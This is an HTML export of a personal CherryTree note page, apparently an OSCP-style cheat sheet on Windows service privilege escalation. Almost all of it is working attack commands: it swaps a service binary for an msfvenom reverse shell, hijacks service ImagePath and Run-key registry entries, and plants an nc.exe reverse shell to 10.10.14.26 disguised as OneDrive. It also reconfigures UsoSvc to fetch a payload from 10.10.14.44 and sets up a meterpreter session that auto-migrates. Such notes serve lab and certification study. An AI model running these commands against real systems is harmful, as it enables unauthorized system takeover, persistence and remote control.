<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>02- service escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>02- service escalation</h1><br/><p></p><p><h2>Exploit</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># find running services : look for path != windows\system32</span><br /><span style="color:#0088ff;font-weight:400">## startMode to check if it is started automatically on reboot </span><br />Get-CimInstance -ClassName win32_service <span style="color:#ff9d00;font-weight:700">|</span> Select Name,State,PathName,StartMode <span style="color:#ff9d00;font-weight:700">|</span> Where-Object {<span style="color:#7f0044;font-weight:400">$_</span>.State -like <span style="color:#3ad900;font-weight:400">&#39;Running&#39;</span>} <span style="color:#ff9d00;font-weight:700">|</span>findstr <span style="color:#7f0044;font-weight:400">$svc</span><br /><br /><span style="color:#0088ff;font-weight:400"># check vuln</span><br />icacls <span style="color:#7f0044;font-weight:400">$path</span><br /><br /><span style="color:#0088ff;font-weight:400">## stop service</span><br />net stop <span style="color:#7f0044;font-weight:400">$svc</span> <br /><br /><span style="color:#0088ff;font-weight:400">## 01 - replace file</span><br />msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span style="color:#7f0044;font-weight:400">$lhost</span> LPORT=443 -f exe -o reverse.exe <br />iwr -uri http://<span style="color:#7f0044;font-weight:400">$lhost</span>/shell.exe -Oufile <span style="color:#7f0044;font-weight:400">$path</span>/<span style="color:#7f0044;font-weight:400">$filename</span> <br /><span style="color:#0088ff;font-weight:400">## 02- persistence </span><br />* adduser.exe <br /><span style="color:#0088ff;font-weight:400">## start service</span><br />net start <span style="color:#7f0044;font-weight:400">$svc</span> <br /><br /><span style="color:#0088ff;font-weight:400">## if service is set to automatic </span><br />wmic service where caption=<span style="color:#3ad900;font-weight:400">&quot;ApacheHTTPServer&quot;</span> get name, caption, state, startmode<br />shutdown /r /t 0</pre></div></p><p><em><h2>Through Registry : writable egitry entry</h2></em></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># 01 check for  vulnerability</span><br /><span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>accesschk.exe <span style="color:#ff9d00;font-weight:700">/</span>accepteula -uvwqk HKLM<span style="color:#333333;font-weight:400">\S</span>ystem<span style="color:#333333;font-weight:400">\C</span>urrentControlSet<span style="color:#333333;font-weight:400">\S</span>ervices<span style="color:#333333;font-weight:400">\r</span>egsvc<br />Get-Acl -Path HKCU<span style="color:#333333;font-weight:400">\S</span>oftware<span style="color:#333333;font-weight:400">\M</span>icrosoft<span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\C</span>urrentVersion<span style="color:#333333;font-weight:400">\R</span>un <span style="color:#ff9d00;font-weight:700">|</span> fl  <br /><br /><span style="color:#0088ff;font-weight:400"># 02  exploit </span><br /><span style="color:#0088ff;font-weight:400">## write to a registry</span><br />reg add HKLM<span style="color:#333333;font-weight:400">\S</span>YSTEM<span style="color:#333333;font-weight:400">\C</span>urrentControlSet<span style="color:#333333;font-weight:400">\s</span>ervices<span style="color:#333333;font-weight:400">\r</span>egsvc /v ImagePath /t REG_EXPAND_SZ /d C:<span style="color:#333333;font-weight:400">\P</span>rivEsc<span style="color:#333333;font-weight:400">\r</span>everse.exe /f<br />reg add HKCU<span style="color:#333333;font-weight:400">\S</span>oftware<span style="color:#333333;font-weight:400">\M</span>icrosoft<span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\C</span>urrentVersion<span style="color:#333333;font-weight:400">\R</span>un /v <span style="color:#3ad900;font-weight:400">&quot;Unnified Remote V3&quot;</span> /t REG_EXPAND_SZ /d C:<span style="color:#333333;font-weight:400">\t</span>emp<span style="color:#333333;font-weight:400">\s</span>hell2.exe /f<br /><span style="color:#0088ff;font-weight:400">### also adds </span><br /><span style="color:#0088ff;font-weight:400">## modify entry</span><br /><br />Set-ItemProperty -path HKCU<span style="color:#333333;font-weight:400">\S</span>oftware<span style="color:#333333;font-weight:400">\M</span>icrosoft<span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\C</span>urrentVersion<span style="color:#333333;font-weight:400">\R</span>un -name OneDrive -value <span style="color:#3ad900;font-weight:400">&quot;C:\windows\system32\spool\drivers\color\nc.exe -e powershell.exe 10.10.14.26 4447&quot;</span><br /><span style="color:#0088ff;font-weight:400">## start sertvice</span><br />   ◇ net start regsvc<br /><br /></pre></div><h3></h3></p><p><h3></h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3></p><p></p><p><h2>Through files </h2><ul><li><h3>sc.exe config UsoSVc binpath=&quot; cmd.exe /c powershell.exe &#39;IWR http://10.10.14.44/rev.ps1 -UseBasicParsing&#39; &quot;</h3></li></ul><h3></h3></p><p><h3> ◇ sc.exe stop UsoSvc</h3><h3></h3></p><p><h3> </h3><ul><li><h3>◇ </h3>◇ <h3>sc.exe start UsoSvc </h3></li></ul><h3></h3></p><p><h3></h3></p><p></p><p><strong><h2>Restart service/shutdown</h2></strong><ul><li>net stop &lt;svc&gt;<ul><li>// generally not allowed for non admins</li></ul></li><li>wmic service where caption=&quot;service&quot; get name,Caption,state,startmode <ul><li>check auton start...</li></ul></li><li>whoami /priv <ul><li>disabled state only means that the priv is not enabled for the running process whoami</li></ul></li><li>shutdown /r /t 0<ul><li>// reboot</li></ul></li></ul></p><p></p><p></p><p></p><p><em><h2>Get a meterpreter session that doesn&#39;t dies</h2></em><ul><li>Set Payload =&gt; windows/meterpreter_reverse_tcp</li></ul></p><p>Set Lhost =&gt; tun0</p><p>Set Lport =&gt; 4444</p><p>Set AutorunScript =&gt; post/windows/manage/migrate</p><p>Set Verbose =&gt; True</p></div>
</body>
</html>
